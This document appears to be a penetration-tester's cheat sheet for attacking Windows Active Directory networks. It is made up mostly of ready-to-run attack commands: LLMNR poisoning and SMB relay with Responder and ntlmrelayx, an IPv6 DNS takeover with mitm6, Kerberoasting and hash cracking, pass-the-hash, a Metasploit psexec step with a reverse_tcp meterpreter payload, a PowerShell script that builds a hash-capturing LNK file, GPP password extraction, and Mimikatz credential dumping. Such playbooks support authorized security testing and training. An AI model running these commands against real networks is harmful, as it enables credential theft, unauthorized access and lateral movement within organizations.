# Internal Penetration Test Methodology

## 1. Enumerate Hosts

### Map Network Hosts

Returns a list of live hosts

`nxc smb 10.25.25.0/24`

## 2. Start With an Nmap Scan

### Comprehensive Nmap Scan
Begin by identifying the target's open ports, services, and potential vulnerabilities.

```bash
nmap -T4 -p- -A <target_ip>
```

**Explanation:**
- `-T4`: Sets the speed to a moderate-fast level.
- `-p-`: Scans all ports.
- `-A`: Provides detailed information about the target, including OS, services, and versions.

## 3. Initial Attack Vector

### Exploit Discovered Vulnerabilities
Based on the Nmap scan results, target specific services and vulnerabilities.

#### LLMNR Poisoning Attack
1. **Victim's Action:**
   - A user tries to access a non-existent resource (e.g., mistyping HackMe as HackM).
   - The system broadcasts an LLMNR request: "Does anyone know where HackM is?"

2. **Attacker's Response:**
   - The attacker (using Responder) replies, "I know where HackM is. Send your credentials."

3. **Result:**
   - The victim sends their NTLM hash, which the attacker captures.
   - If the password is weak, the attacker can crack the hash offline.

### Steps to Perform the Attack
1. **Run Responder:**
   ```bash
   sudo responder -I eth0 -dwv
   ```
   - `-I`: Specify the interface (e.g., eth0 for local networks or tun0 for VPNs).
   - `-dwv`: Ensures Responder is set to perform poisoning.

2. **Capture Hashes:**
   - Responder listens for LLMNR and NBT-NS queries and responds.
   - Once a victim system sends an NTLM hash, it is displayed in Responder's output.

3. **Crack the Hash:**
   ```bash
   hashcat -m 1000 hash.txt wordlist.txt
   ```
   - `-m 1000`: NTLM hash mode.
   - `hash.txt`: File containing captured hash.
   - `wordlist.txt`: Password dictionary to attempt cracking.

#### SMB Relay Attack
#### Steps:
1. **Identifying Hosts Without SMB Signing Enabled:**
   ```bash
   nmap --script smb2-security-mode.nse -p 445 <IP> -Pn
   ```
   - Use `-Pn` to bypass ICMP ping checks, useful when ping probes are blocked.
   - Grep results to identify hosts where SMB signing is enabled but not required.

2. **Creating a Targets File:**
   - Create a file named `targets.txt` and add the IPs of identified hosts:
     ```
     10.25.25.4
     10.25.25.5
     ```

3. **Configuring Responder:**
   ```bash
   sudo mousepad /etc/responder/Responder.conf
   ```
   - Disable SMB and HTTP by setting them to Off.

4. **Setting Up NTLM Relay:**
   ```bash
   ntlmrelayx.py -tf targets.txt -smb2support
   ```
   - `-tf`: Specifies the targets file.
   - `-smb2support`: Enables SMB2 protocol support.

5. **Triggering the Attack:**
   - Wait for Responder to capture NTLMv2 hashes.
   - Relay the captured credentials to a target host.
   - Gain access as a local administrator if the target host is vulnerable.

#### IPv6 DNS Takeover via MITM6
#### Steps:
1. **Installing MITM6:**
   ```bash
   sudo pip2 install .
   ```
2. **Start MITM6:**
   ```bash
   sudo mitm6 -d Empire.local
   ```
   - `-d Empire.local`: Specifies the target domain.

3. **Set Up NTLMRelayX:**
   ```bash
   ntlmrelayx.py -6 -t ldaps://10.25.25.2 -wh fakewpad.empire.local -l lootme
   ```
   - `-6`: Enables IPv6.
   - `-t`: Specifies the target service (e.g., LDAPS).
   - `-wh`: Sets up a fake WPAD entry.
   - `-l lootme`: Specifies the folder to store captured data.

4. **Simulate Network Events:**
   - Events like machine reboots or user logins trigger authentication requests.

5. **Capture NTLM Hashes:**
   - MITM6 assigns spoofed IPv6 addresses, redirecting traffic through the attacker's machine.

6. **Extract Domain Information:**
   - NTLMRelayX uses LDAPDomainDump to enumerate domain information.

7. **Identify High-Value Targets:**
   - Analyze the extracted data for domain administrators and service accounts.

8. **Simulate Administrator Login:**
   - Log in as a domain administrator to trigger additional NTLM authentication.

9. **Create New Domain User:**
   - Verify the account creation in the domain controller’s user list.


## 4. Post-Compromise Enumeration

### Enumerating Active Directory
After gaining initial access, enumerate the Active Directory environment for further exploitation.

#### Using `BloodHound`:

1. Transfer `BloodHound` and `SharpHound` to the compromised machine.
2. Run `SharpHound` to collect data:

    ```bash
    SharpHound.exe -c All
    ```

3. Import the data into `BloodHound` and analyze the AD relationships.

#### Graphical Analysis with BloodHound
 1. Exploring Data
- BloodHound offers a rich graphical interface for analyzing AD relationships. Key features include:
     - Node Info: View details about users, computers, and groups.
     - Relationships: Identify connections between AD objects.
  
 
 2. Common Queries
- Find All Domain Admins: Lists domain administrators and their access paths.
- High-Value Targets: Identifies critical AD objects, such as domain controllers or privileged accounts.
- Group Policy Objects (GPOs): View policies applied to users or computers, such as disabling Windows Defender.
- Service Principal Names (SPNs): Detect accounts with SPNs, which may be vulnerable to Kerberoasting.
 
 3. Advanced Insights
- Detecting anomalies, such as:
     - Domain admins logged into non-domain controllers.
     - Unsupported operating systems in the environment.
  
   - Potential attack paths, including token impersonation or credential dumping.

## 5. Post-Compromise Attack

### Lateral Movement

1. **Pass the Hash Attack:**
   - **Concept:**
     - Use the NTLM hash of a user's password to authenticate without needing the plaintext password.
   - **Execution with NetExec:**
     - Use NetExec to authenticate using the NTLM hash:
       ```bash
       netexec smb <target_ip> -u <username> -p <ntlm_hash> -d <domain>
       ```
       - `<target_ip>`: IP address of the target machine.
       - `<username>`: User account.
       - `<ntlm_hash>`: NTLM hash of the password.
       - `<domain>`: Domain name.

2. **Pass the Password Attack:**
   - **Concept:**
     - Use a cracked or known plaintext password to move laterally within the network.
   - **Execution with NetExec:**
     - Use NetExec to authenticate using the plaintext password:
       ```bash
       netexec smb <target_ip> -u <username> -p <password> -d <domain>
       ```
       - `<target_ip>`: IP address of the target machine.
       - `<username>`: User account.
       - `<password>`: Plaintext password.
       - `<domain>`: Domain name.

 3. **Kerberoasting Attack:**
   - **Prerequisites:**
     - Compromised Domain Credentials: The attacker needs valid credentials for any domain user account (e.g., fcastle with password password1).
     - Access to the Domain Controller: The attacker communicates with the KDC to request tickets.
   - **Extracting SPN Hashes:**
     ```bash
     sudo GetUserSPNs.py marvel.local/fcastle:Password1 -dc-ip 192.168.138.136 -request
     ```
     - Connects to the KDC using the provided credentials.
     - Enumerates SPNs in the domain.
     - Retrieves the TGS hashes for the identified SPNs.
   - **Analyzing SPN Data:**
     - Output includes SPN details, password last set, last logon timestamps, and group memberships.
   - **Cracking the TGS Hash:**
     ```bash
     hashcat -m 13100 KRB.txt /usr/share/wordlists/rockyou.txt
     ```
     - Mode 13100 is specific to Kerberos 5 TGS hashes.
     - Reveals the plaintext password after cracking.

4. **Token Impersonation Attack:**
   - **Understanding Tokens:**
     - Access Tokens: Represent the security context of a process or thread, including the user account, groups, and privileges.
     - Delegate Tokens: Used when a user logs into a machine and enables operations on their behalf.
     - Impersonation Tokens: Allow attackers to act as another user or process temporarily.
   - **Gaining Initial Access:**
     - Use Metasploit to exploit a vulnerable machine (e.g., via `exploit/windows/smb/psexec`).
     - Configure the payload:
       ```bash
       set RHOST <target_ip>
       set SMBUser <username>
       set SMBPass <password>
       set SMBDomain <domain>
       set payload windows/x64/meterpreter/reverse_tcp
       ```
   - **Verify Privileges:**
     - Confirm privilege level using `whoami`.
   - **Load the Incognito Module:**
     - Load the incognito extension in Metasploit to manage tokens.
     - Use commands like `list_tokens -u` and `list_tokens -g`.
   - **Impersonate a Token:**
     - Identify high-value tokens and use the `impersonate_token` command.

5. **LNK File Attack:**
   - **Concept and Purpose:**
     - Exploits Windows shortcut files (.lnk) to execute malicious actions and capture NTLM hashes.
   - **Steps Involved in LNK File Creation:**
     - Use a PowerShell script to create the LNK file.
     ```powershell
     $objShell = New-Object -ComObject WScript.shell
     $lnk = $objShell.CreateShortcut("C:\test.lnk")
     $lnk.TargetPath = "\\192.168.138.149\@test.png"
     $lnk.WindowStyle = 1
     $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
     $lnk.Description = "Test"
     $lnk.HotKey = "Ctrl+Alt+T"
     $lnk.Save()
     ```
   - **Placement of LNK File:**
     - Place the LNK file in a shared folder.
   - **Hash Capture with Responder:**
     - Run Responder to capture authentication hashes.
     ```bash
     sudo responder -I eth0
     ```

6. **GPP / cPassword Attacks Using Metasploit:**
   - **Objective:**
     - Extract and decrypt the cPassword value from SYSVOL to obtain credentials.
   - **Steps to Perform the Attack:**
     - Setup Metasploit and search for the GPP module.
     ```bash
     search gpp
     use auxiliary/scanner/smb/smb_enum_gpp
     set RHOSTS <target_domain_controller_ip>
     set SMBUser <domain_username>
     set SMBPass <domain_password>
     run
     ```
     - The module will scan SYSVOL for GPP XML files containing cPassword.
     - Decrypt cPassword to reveal plaintext credentials.

7. **Credential Dumping with Mimikatz:**
   - **Introduction:**
     - Extract account login information from a system's memory.
   - **Initial Setup:**
     - Download and transfer Mimikatz to the target machine.
     - Run Mimikatz and set privilege mode to debug.
   - **Credential Dumping Techniques:**
     ```bash
     sekurlsa::logonpasswords
     ```
     - Dump credentials and review output for sensitive information.





